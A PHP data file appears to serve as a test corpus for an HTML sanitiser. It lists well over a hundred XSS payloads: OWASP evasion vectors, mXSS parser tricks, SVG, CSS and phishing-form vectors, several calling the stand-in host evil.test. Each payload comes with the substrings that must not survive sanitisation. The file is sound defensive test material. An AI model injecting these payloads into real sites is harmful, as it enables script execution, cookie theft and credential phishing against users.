<?php

/*
 * XSS test corpus.
 *
 * Data only, no logic. Each entry is:
 *   'name' => [
 *       'html'   => '<payload as a theme might output it>',
 *       'forbid' => ['needle1', 'needle2', ...],
 *   ]
 *
 * `forbid` needles are case-insensitive substrings that MUST NOT appear in the
 * sanitised output for the attack to be considered neutralised. Every needle is
 * deliberately chosen so that it DOES occur (case-insensitively) in the raw
 * html of the same entry, so a passing assertion is meaningful. Needles are
 * attack-specific (tag/attribute/URL), never harmless leftover text.
 *
 * All external hosts use evil.test.
 */

return [

    // ---------------------------------------------------------------------
    // 1. OWASP XSS Filter Evasion cheat sheet vectors
    // ---------------------------------------------------------------------

    'owasp_img_onerror' => [
        'html' => '<IMG SRC=x onerror="alert(1)">',
        'forbid' => ['onerror'],
    ],
    'owasp_img_src_javascript' => [
        'html' => '<IMG SRC=javascript:alert(\'XSS\')>',
        'forbid' => ['javascript:'],
    ],
    'owasp_img_src_javascript_quoted' => [
        'html' => '<IMG SRC="javascript:alert(\'XSS\');">',
        'forbid' => ['javascript:'],
    ],
    'owasp_img_lowsrc' => [
        'html' => '<IMG LOWSRC=javascript:alert(\'XSS\')>',
        'forbid' => ['javascript:'],
    ],
    'owasp_img_dynsrc' => [
        'html' => '<IMG DYNSRC=javascript:alert(\'XSS\')>',
        'forbid' => ['javascript:'],
    ],
    'owasp_img_mixedcase' => [
        'html' => '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
        'forbid' => ['javascript:'],
    ],
    'owasp_img_charcode' => [
        'html' => '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
        'forbid' => ['javascript:'],
    ],
    'owasp_img_no_quotes_semicolon' => [
        'html' => '<IMG SRC=javascript:alert(\'XSS\');>',
        'forbid' => ['javascript:'],
    ],
    'owasp_img_hash_onmouseover' => [
        'html' => '<IMG SRC=# onmouseover="alert(\'xxs\')">',
        'forbid' => ['onmouseover'],
    ],
    'owasp_img_empty_onmouseover' => [
        'html' => '<IMG SRC= onmouseover="alert(\'xxs\')">',
        'forbid' => [' onmouseover'], // the parser makes it the src VALUE (inert text); no handler attribute may survive
    ],
    'owasp_img_onmouseover_only' => [
        'html' => '<IMG onmouseover="alert(\'xxs\')">',
        'forbid' => ['onmouseover'],
    ],
    'owasp_img_slash_onerror' => [
        'html' => '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))">',
        'forbid' => ['onerror'],
    ],
    'owasp_img_backtick' => [
        'html' => '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
        'forbid' => ['javascript:'],
    ],
    'owasp_body_onload' => [
        'html' => '<BODY ONLOAD=alert(\'XSS\')>',
        'forbid' => ['onload'],
    ],
    'owasp_body_background' => [
        'html' => '<BODY BACKGROUND=javascript:alert(\'XSS\')>',
        'forbid' => ['javascript:'],
    ],
    'owasp_body_background_quoted' => [
        'html' => '<BODY BACKGROUND="javascript:alert(/XSS/)">',
        'forbid' => ['javascript:'],
    ],
    'owasp_input_type_image_onerror' => [
        'html' => '<INPUT TYPE=IMAGE SRC=x ONERROR=alert(1)>',
        'forbid' => ['onerror'],
    ],
    'owasp_input_formaction' => [
        'html' => '<INPUT TYPE=SUBMIT FORMACTION=javascript:alert(1)>',
        'forbid' => ['formaction', 'javascript:'],
    ],
    'owasp_a_href_javascript' => [
        'html' => '<A HREF="javascript:alert(\'XSS\')">X</A>',
        'forbid' => ['javascript:'],
    ],
    'owasp_table_background' => [
        'html' => '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
        'forbid' => ['javascript:'],
    ],
    'owasp_td_background' => [
        'html' => '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
        'forbid' => ['javascript:'],
    ],
    'owasp_div_style_url_javascript' => [
        'html' => '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
        'forbid' => ['javascript:'],
    ],
    'owasp_div_style_url_encoded' => [
        'html' => '<DIV STYLE="background-image: url(&#1;javascript:alert(\'XSS\'))">',
        'forbid' => ['javascript:'],
    ],
    'owasp_div_style_expression' => [
        'html' => '<DIV STYLE="width: expression(alert(\'XSS\'));">',
        'forbid' => ['expression('],
    ],
    'owasp_meta_refresh_javascript' => [
        'html' => '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
        'forbid' => ['http-equiv', 'javascript:'],
    ],
    'owasp_meta_refresh_data_uri' => [
        'html' => '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
        'forbid' => ['http-equiv'],
    ],
    'owasp_meta_refresh_external' => [
        'html' => '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://evil.test/x.html">',
        'forbid' => ['http-equiv', 'evil.test'],
    ],
    'owasp_base_href_javascript' => [
        'html' => '<BASE HREF="javascript:alert(\'XSS\');//">',
        'forbid' => ['<base', 'javascript:'],
    ],
    'owasp_base_href_external' => [
        'html' => '<BASE HREF="http://evil.test/">',
        'forbid' => ['<base', 'evil.test'],
    ],
    'owasp_object_scriptlet' => [
        'html' => '<OBJECT TYPE="text/x-scriptlet" DATA="http://evil.test/x.html"></OBJECT>',
        'forbid' => ['<object', 'evil.test'],
    ],
    'owasp_object_flash' => [
        'html' => '<OBJECT TYPE="application/x-shockwave-flash" DATA="http://evil.test/x.swf"></OBJECT>',
        'forbid' => ['<object', 'evil.test'],
    ],
    'owasp_embed_flash' => [
        'html' => '<EMBED SRC="http://evil.test/x.swf" type="application/x-shockwave-flash">',
        'forbid' => ['<embed', 'evil.test'],
    ],
    'owasp_embed_svg_data' => [
        'html' => '<EMBED SRC="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" type="image/svg+xml">',
        'forbid' => ['<embed', 'data:image/svg'],
    ],
    'owasp_link_stylesheet_javascript' => [
        'html' => '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
        'forbid' => ['javascript:'],
    ],
    'owasp_link_stylesheet_external' => [
        'html' => '<LINK REL="stylesheet" HREF="http://evil.test/x.css">',
        'forbid' => ['evil.test'],
    ],
    'owasp_style_at_import' => [
        'html' => '<STYLE>@import\'http://evil.test/x.css\';</STYLE>',
        'forbid' => ['@import', 'evil.test'],
    ],
    'owasp_style_moz_binding' => [
        'html' => '<STYLE>BODY{-moz-binding:url("http://evil.test/x.xml#xss")}</STYLE>',
        'forbid' => ['-moz-binding'],
    ],
    'owasp_xss_behavior' => [
        'html' => '<XSS STYLE="behavior: url(xss.htc);">',
        'forbid' => ['behavior:'],
    ],
    'owasp_style_list_style_image' => [
        'html' => '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE>',
        'forbid' => ['javascript:'],
    ],
    'owasp_iframe_javascript' => [
        'html' => '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
        'forbid' => ['<iframe', 'javascript:'],
    ],
    'owasp_iframe_onmouseover' => [
        'html' => '<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>',
        'forbid' => ['<iframe', 'onmouseover'],
    ],
    'owasp_table_background_div_noquote' => [
        'html' => '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
        'forbid' => ['javascript:'],
    ],

    'owasp_img_malformed_script' => [
        'html' => '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
        'forbid' => ['<script'],
    ],
    'owasp_script_slash_xss_src' => [
        'html' => '<SCRIPT/XSS SRC="http://evil.test/xss.js"></SCRIPT>',
        'forbid' => ['<script', 'evil.test'],
    ],
    'owasp_script_src_lt_b' => [
        'html' => '<SCRIPT SRC=http://evil.test/xss.js?<B>',
        'forbid' => ['<script', 'evil.test'],
    ],
    'owasp_script_src_protocol_relative' => [
        'html' => '<SCRIPT SRC=//evil.test/.j>',
        'forbid' => ['<script', 'evil.test'],
    ],
    'owasp_script_src_mixedcase' => [
        'html' => '<SCRIPT SRc=http://evil.test/x.js>',
        'forbid' => ['<script', 'evil.test'],
    ],
    'owasp_script_attr_gt_src' => [
        'html' => '<SCRIPT a=">" SRC="http://evil.test/xss.js"></SCRIPT>',
        'forbid' => ['<script', 'evil.test'],
    ],
    'owasp_script_attr_eq_gt' => [
        'html' => '<SCRIPT =">" SRc="http://evil.test/xss.js"></SCRIPT>',
        'forbid' => ['<script', 'evil.test'],
    ],
    'owasp_script_attr_gt_quote_src' => [
        'html' => '<SCRIPT a=">" \'\' SRC="http://evil.test/xss.js"></SCRIPT>',
        'forbid' => ['<script', 'evil.test'],
    ],
    'owasp_script_attr_single_gt' => [
        'html' => '<SCRIPT "a=\'>\'" SRC="http://evil.test/xss.js"></SCRIPT>',
        'forbid' => ['<script', 'evil.test'],
    ],
    'owasp_script_attr_backtick_src' => [
        'html' => '<SCRIPT a=`>`\' SRC="http://evil.test/xss.js"></SCRIPT>',
        'forbid' => ['<script', 'evil.test'],
    ],
    'owasp_script_split_document_write' => [
        'html' => '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://evil.test/xss.js"></SCRIPT>',
        'forbid' => ['<script'], // the leftover is inert text
    ],
    'owasp_iframe_halfopen' => [
        'html' => '<iframe src=http://evil.test/x.html <',
        'forbid' => ['<iframe', 'evil.test'],
    ],
    'owasp_iframe_halfopen_quoted' => [
        'html' => '<iframe src="http://evil.test/x.html" <',
        'forbid' => ['<iframe', 'evil.test'],
    ],
    'owasp_iframe_halfopen_trailing' => [
        'html' => '<iframe src=http://evil.test/x.html < ',
        'forbid' => ['<iframe', 'evil.test'],
    ],
    'owasp_embed_halfopen' => [
        'html' => '<embed src=http://evil.test/x.swf <',
        'forbid' => ['<embed', 'evil.test'],
    ],
    'owasp_script_tab_split' => [
        'html' => '<a href="jav&#x09;ascript:alert(1)">X</a>',
        'forbid' => ['jav&#x09;ascript'],
    ],
    'owasp_script_newline_split' => [
        'html' => '<a href="jav&#x0A;ascript:alert(1)">X</a>',
        'forbid' => ['jav&#x0A;ascript'],
    ],
    'owasp_script_cr_split' => [
        'html' => '<a href="jav&#x0D;ascript:alert(1)">X</a>',
        'forbid' => ['jav&#x0D;ascript'],
    ],
    'owasp_script_hex_j' => [
        'html' => '<a href="&#x6A;avascript:alert(1)">X</a>',
        'forbid' => ['&#x6A;avascript'],
    ],
    'owasp_script_decimal_j' => [
        'html' => '<a href="&#106;avascript:alert(1)">X</a>',
        'forbid' => ['&#106;avascript'],
    ],
    'owasp_script_decimal_nosemicolon' => [
        'html' => '<a href="&#0000106&#0000097vascript:alert(1)">X</a>',
        'forbid' => ['&#0000106&#0000097vascript'],
    ],
    'owasp_script_literal_tab' => [
        'html' => "<a href=\"jav\tascript:alert(1)\">X</a>",
        'forbid' => ["jav\tascript"],
    ],
    'owasp_script_literal_newline' => [
        'html' => "<a href=\"jav\nascript:alert(1)\">X</a>",
        'forbid' => ["jav\nascript"],
    ],
    'owasp_img_entity_tab' => [
        'html' => '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
        'forbid' => ['jav&#x09;ascript'],
    ],
    'owasp_img_entity_newline' => [
        'html' => '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
        'forbid' => ['jav&#x0A;ascript'],
    ],
    'owasp_img_entity_cr' => [
        'html' => '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
        'forbid' => ['jav&#x0D;ascript'],
    ],
    'owasp_img_entity_prefixed_space' => [
        'html' => '<IMG SRC=" &#14; javascript:alert(\'XSS\');">',
        'forbid' => ['javascript:'],
    ],
    'owasp_img_entity_encoded_onerror' => [
        'html' => '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">',
        'forbid' => ['onerror'],
    ],
    'owasp_svg_script_href' => [
        'html' => '<svg><script href="http://evil.test/x.js"></script></svg>',
        'forbid' => ['<script', 'evil.test'],
    ],
    'owasp_isindex' => [
        'html' => '<isindex action="javascript:alert(1)" type=image>',
        'forbid' => ['javascript:'],
    ],
    'owasp_marquee_onstart' => [
        'html' => '<marquee onstart="alert(1)">X</marquee>',
        'forbid' => ['onstart'],
    ],
    'owasp_plaintext_script' => [
        'html' => '<plaintext><script>alert(1)</script>',
        'forbid' => ['<script'],
    ],

    // ---------------------------------------------------------------------
    // 2. mXSS / parser-differential vectors
    // ---------------------------------------------------------------------

    'mxss_noscript_title' => [
        'html' => '<noscript><p title="</noscript><img src=x onerror=1>">',
        'forbid' => ['onerror'],
    ],
    'mxss_svg_style_img' => [
        'html' => '<svg><style><img src=x onerror=1>',
        'forbid' => ['onerror'],
    ],
    'mxss_math_mtext_table_mglyph' => [
        'html' => '<math><mtext><table><mglyph><style><img src=x onerror=1>',
        'forbid' => ['<math', 'onerror'],
    ],
    'mxss_form_math_mtext' => [
        'html' => '<form><math><mtext></form><form><mglyph><style></math><img src onerror=1>',
        'forbid' => ['<math', 'onerror'],
    ],
    'mxss_svg_p_style_a' => [
        'html' => '<svg></p><style><a id="</style><img src=1 onerror=1>">',
        'forbid' => ['onerror'],
    ],
    'mxss_nested_comment' => [
        'html' => '<!--><img src=x onerror=1>-->',
        'forbid' => ['onerror'],
    ],
    'mxss_comment_bracket' => [
        'html' => '<!--[if gte IE 4]><script>alert(1)</script><![endif]-->',
        'forbid' => ['<script'],
    ],
    'mxss_template_script' => [
        'html' => '<template><script>alert(1)</script></template>',
        'forbid' => ['<template', '<script'],
    ],
    'mxss_textarea_script' => [
        'html' => '<textarea></textarea><script>alert(1)</script>',
        'forbid' => ['<script'],
    ],
    'mxss_title_img' => [
        'html' => '<title><img src=x onerror=1></title>',
        'forbid' => ['onerror'],
    ],
    'mxss_title_script' => [
        'html' => '<title></title><script>alert(1)</script>',
        'forbid' => ['<script'],
    ],
    'mxss_svg_cdata_script' => [
        'html' => '<svg><![CDATA[<script>alert(1)</script>]]></svg>',
        'forbid' => ['<script'],
    ],
    'mxss_math_cdata_img' => [
        'html' => '<math><![CDATA[<img src=x onerror=1>]]></math>',
        'forbid' => ['<math', 'onerror'],
    ],
    'mxss_style_breakout_script' => [
        'html' => '<style></style><script>alert(1)</script>',
        'forbid' => ['<script'],
    ],
    'mxss_svg_style_breakout' => [
        'html' => '<svg><style></style><script>alert(1)</script></svg>',
        'forbid' => ['<script'],
    ],
    'mxss_noscript_img' => [
        'html' => '<noscript><img src=x onerror=1></noscript>',
        'forbid' => ['onerror'],
    ],
    'mxss_math_style_breakout' => [
        'html' => '<math><style><img src=x onerror=1></style></math>',
        'forbid' => ['<math', 'onerror'],
    ],
    'mxss_select_style_img' => [
        'html' => '<select><style><img src=x onerror=1></style></select>',
        'forbid' => ['onerror'],
    ],
    'mxss_iframe_srcdoc_title' => [
        'html' => '<iframe srcdoc="<title><img src=x onerror=1></title>"></iframe>',
        'forbid' => ['<iframe', 'srcdoc', 'onerror'],
    ],
    'mxss_p_style_comment' => [
        'html' => '<p><style><!--</style><img src=x onerror=1>--></p>',
        'forbid' => ['onerror'],
    ],

    // ---------------------------------------------------------------------
    // 3. SVG vectors
    // ---------------------------------------------------------------------

    'svg_onload' => [
        'html' => '<svg onload=alert(1)>',
        'forbid' => ['onload'],
    ],
    'svg_script' => [
        'html' => '<svg><script>alert(1)</script></svg>',
        'forbid' => ['<script'],
    ],
    'svg_script_xlink_href' => [
        'html' => '<svg><script xlink:href="http://evil.test/x.js"></script></svg>',
        'forbid' => ['<script', 'evil.test'],
    ],
    'svg_a_xlink_href_javascript' => [
        'html' => '<svg><a xlink:href="javascript:alert(1)"><text>X</text></a></svg>',
        'forbid' => ['javascript:'],
    ],
    'svg_a_href_javascript' => [
        'html' => '<svg><a href="javascript:alert(1)"><text>X</text></a></svg>',
        'forbid' => ['javascript:'],
    ],
    'svg_animate_href_javascript' => [
        'html' => '<svg><animate attributeName=href values=javascript:alert(1)></animate></svg>',
        'forbid' => ['javascript:'],
    ],
    'svg_set_onmouseover' => [
        'html' => '<svg><set attributeName=onmouseover to=alert(1)></set></svg>',
        'forbid' => ['onmouseover'],
    ],
    'svg_use_data_svg' => [
        'html' => '<svg><use href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+"></use></svg>',
        'forbid' => ['data:image/svg'],
    ],
    'svg_use_external' => [
        'html' => '<svg><use href="https://evil.test/x.svg#a"></use></svg>',
        'forbid' => ['evil.test'],
    ],
    'svg_foreignobject' => [
        'html' => '<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>',
        'forbid' => ['<foreignobject', 'onload'],
    ],
    'svg_image_href_javascript' => [
        'html' => '<svg><image href="javascript:alert(1)"></image></svg>',
        'forbid' => ['javascript:'],
    ],
    'svg_image_xlink_href_javascript' => [
        'html' => '<svg><image xlink:href="javascript:alert(1)"></image></svg>',
        'forbid' => ['javascript:'],
    ],
    'svg_animate_transform_onbegin' => [
        'html' => '<svg><animateTransform onbegin=alert(1) attributeName=transform></animateTransform></svg>',
        'forbid' => ['onbegin'],
    ],
    'svg_foreignobject_iframe' => [
        'html' => '<svg><foreignObject><iframe src="http://evil.test/x.html"></iframe></foreignObject></svg>',
        'forbid' => ['<foreignobject', '<iframe', 'evil.test'],
    ],
    'svg_style_import' => [
        'html' => '<svg><style>@import url("http://evil.test/x.css");</style></svg>',
        'forbid' => ['@import', 'evil.test'],
    ],
    'svg_handler_onload_nested' => [
        'html' => '<svg><g onload=alert(1)></g></svg>',
        'forbid' => ['onload'],
    ],

    // ---------------------------------------------------------------------
    // 4. CSS vectors
    // ---------------------------------------------------------------------

    'css_style_url_javascript' => [
        'html' => '<style>body { background-image: url(javascript:alert(1)); }</style>',
        'forbid' => ['javascript:'],
    ],
    'css_style_url_quoted_javascript' => [
        'html' => '<style>body { background-image: url("javascript:alert(1)"); }</style>',
        'forbid' => ['javascript:'],
    ],
    'css_inline_url_javascript' => [
        'html' => '<span style="background:url(javascript:alert(1))">X</span>',
        'forbid' => ['javascript:'],
    ],
    'css_css_escape_javascript' => [
        'html' => '<style>body { background-image: url("java\73 cript:alert(1)"); }</style>',
        'forbid' => ['java\73'],
    ],
    'css_css_escape_hex_all' => [
        'html' => '<style>body { background-image: url(\6a\61\76\61\73\63\72\69\70\74:alert(1)); }</style>',
        'forbid' => ['\6a\61'],
    ],
    'css_expression' => [
        'html' => '<style>div { width: expression(alert(1)); }</style>',
        'forbid' => ['expression('],
    ],
    'css_expression_inline' => [
        'html' => '<div style="width: expression(alert(1));">X</div>',
        'forbid' => ['expression('],
    ],
    'css_expression_obfuscated_comment' => [
        'html' => '<div style="width: expr/*x*/ession(alert(1));">X</div>',
        'forbid' => ['expr/*x*/ession('],
    ],
    'css_expression_newline' => [
        'html' => "<div style=\"width: expression\n(alert(1));\">X</div>",
        'forbid' => ['expression'],
    ],
    'css_at_import' => [
        'html' => '<style>@import url("http://evil.test/x.css");</style>',
        'forbid' => ['@import', 'evil.test'],
    ],
    'css_at_import_single_quote' => [
        'html' => '<style>@import \'http://evil.test/x.css\';</style>',
        'forbid' => ['@import', 'evil.test'],
    ],
    'css_at_import_media' => [
        'html' => '<style>@import url(http://evil.test/x.css) screen;</style>',
        'forbid' => ['@import', 'evil.test'],
    ],
    'css_at_import_data' => [
        'html' => '<style>@import url("data:text/css,body{background:red}");</style>',
        'forbid' => ['@import', 'data:text/css'],
    ],
    'css_behavior_url' => [
        'html' => '<div style="behavior: url(xss.htc);">X</div>',
        'forbid' => ['behavior:'],
    ],
    'css_behavior_expression' => [
        'html' => '<div style="behavior: url(#default#time2);">X</div>',
        'forbid' => ['behavior:'],
    ],
    'css_moz_binding_url' => [
        'html' => '<div style="-moz-binding: url(http://evil.test/x.xml#xss);">X</div>',
        'forbid' => ['-moz-binding', 'evil.test'],
    ],
    'css_moz_binding_style_tag' => [
        'html' => '<style>div { -moz-binding: url("http://evil.test/x.xml#xss"); }</style>',
        'forbid' => ['-moz-binding', 'evil.test'],
    ],
    'css_vbscript_url' => [
        'html' => '<div style="background: url(vbscript:msgbox(1))">X</div>',
        'forbid' => ['vbscript:'],
    ],
    'css_style_breakout_script' => [
        'html' => '<style></style><script>alert(1)</script>',
        'forbid' => ['<script'],
    ],
    'css_style_breakout_div_img' => [
        'html' => '<style>a{}</style><img src=x onerror=alert(1)>',
        'forbid' => ['onerror'],
    ],
    'css_import_external_no_proto' => [
        'html' => '<style>@import "//evil.test/x.css";</style>',
        'forbid' => ['@import', 'evil.test'],
    ],
    'css_style_url_data_svg' => [
        'html' => '<style>body { background: url("data:image/svg+xml;base64,PHN2Zz4="); }</style>',
        'forbid' => ['data:image/svg'],
    ],
    'css_style_uppercase' => [
        'html' => '<STYLE>body { background: url(JAVASCRIPT:alert(1)); }</STYLE>',
        'forbid' => ['javascript:'],
    ],

    // ---------------------------------------------------------------------
    // 5. Phishing / redirect vectors
    // ---------------------------------------------------------------------

    'phish_form_action_external' => [
        'html' => '<form action="https://evil.test/login"><input name=password></form>',
        'forbid' => ['evil.test'],
    ],
    'phish_form_action_http' => [
        'html' => '<form action="http://evil.test/login" method="post">X</form>',
        'forbid' => ['evil.test'],
    ],
    'phish_form_action_javascript' => [
        'html' => '<form action="javascript:alert(1)">X</form>',
        'forbid' => ['javascript:'],
    ],
    'phish_form_action_protocol_relative' => [
        'html' => '<form action="//evil.test/login">X</form>',
        'forbid' => ['evil.test'],
    ],
    'phish_button_formaction_external' => [
        'html' => '<button formaction="https://evil.test/login">Login</button>',
        'forbid' => ['formaction', 'evil.test'],
    ],
    'phish_button_formaction_javascript' => [
        'html' => '<button formaction="javascript:alert(1)">Login</button>',
        'forbid' => ['formaction', 'javascript:'],
    ],
    'phish_input_formaction_external' => [
        'html' => '<input type="submit" formaction="https://evil.test/login">',
        'forbid' => ['formaction', 'evil.test'],
    ],
    'phish_input_formaction_javascript' => [
        'html' => '<input type="image" formaction="javascript:alert(1)">',
        'forbid' => ['formaction', 'javascript:'],
    ],
    'phish_a_href_data_text_html' => [
        'html' => '<a href="data:text/html,<script>alert(1)</script>">X</a>',
        'forbid' => ['data:text/html', '<script'],
    ],
    'phish_a_href_data_text_html_base64' => [
        'html' => '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">X</a>',
        'forbid' => ['data:text/html'],
    ],
    // Plain external <a href> links are legitimate navigation, not an attack (not in the corpus).
    'phish_area_href_javascript' => [
        'html' => '<map><area href="javascript:alert(1)" shape=rect coords="0,0,1,1"></map>',
        'forbid' => ['javascript:'],
    ],
    'phish_area_href_external' => [
        'html' => '<map><area href="https://evil.test/login" shape=rect coords="0,0,1,1"></map>',
        'forbid' => ['evil.test'],
    ],
    'phish_iframe_srcdoc_script' => [
        'html' => '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
        'forbid' => ['<iframe', 'srcdoc', '<script'],
    ],
    'phish_iframe_srcdoc_img' => [
        'html' => '<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>',
        'forbid' => ['<iframe', 'srcdoc', 'onerror'],
    ],
    'phish_iframe_srcdoc_escaped' => [
        'html' => '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
        'forbid' => ['<iframe', 'srcdoc'],
    ],
    'phish_iframe_src_external' => [
        'html' => '<iframe src="https://evil.test/frame"></iframe>',
        'forbid' => ['<iframe', 'evil.test'],
    ],
    'phish_meta_refresh_external' => [
        'html' => '<meta http-equiv="refresh" content="0;url=https://evil.test/login">',
        'forbid' => ['http-equiv', 'evil.test'],
    ],
    'phish_meta_refresh_protocol_relative' => [
        'html' => '<meta http-equiv="refresh" content="0;url=//evil.test/login">',
        'forbid' => ['http-equiv', 'evil.test'],
    ],
    'phish_meta_refresh_javascript' => [
        'html' => '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        'forbid' => ['http-equiv', 'javascript:'],
    ],
    'phish_meta_refresh_data_uri' => [
        'html' => '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">',
        'forbid' => ['http-equiv', 'data:text/html'],
    ],
    'phish_base_href_external' => [
        'html' => '<base href="https://evil.test/">',
        'forbid' => ['<base', 'evil.test'],
    ],
    'phish_object_data_external' => [
        'html' => '<object data="https://evil.test/x.html" type="text/html"></object>',
        'forbid' => ['<object', 'evil.test'],
    ],
    'phish_embed_src_external' => [
        'html' => '<embed src="https://evil.test/x.html" type="text/html">',
        'forbid' => ['<embed', 'evil.test'],
    ],
    'phish_form_action_external_get' => [
        'html' => '<form method="GET" action="https://evil.test/phish"><input type=text name=user></form>',
        'forbid' => ['evil.test'],
    ],

];
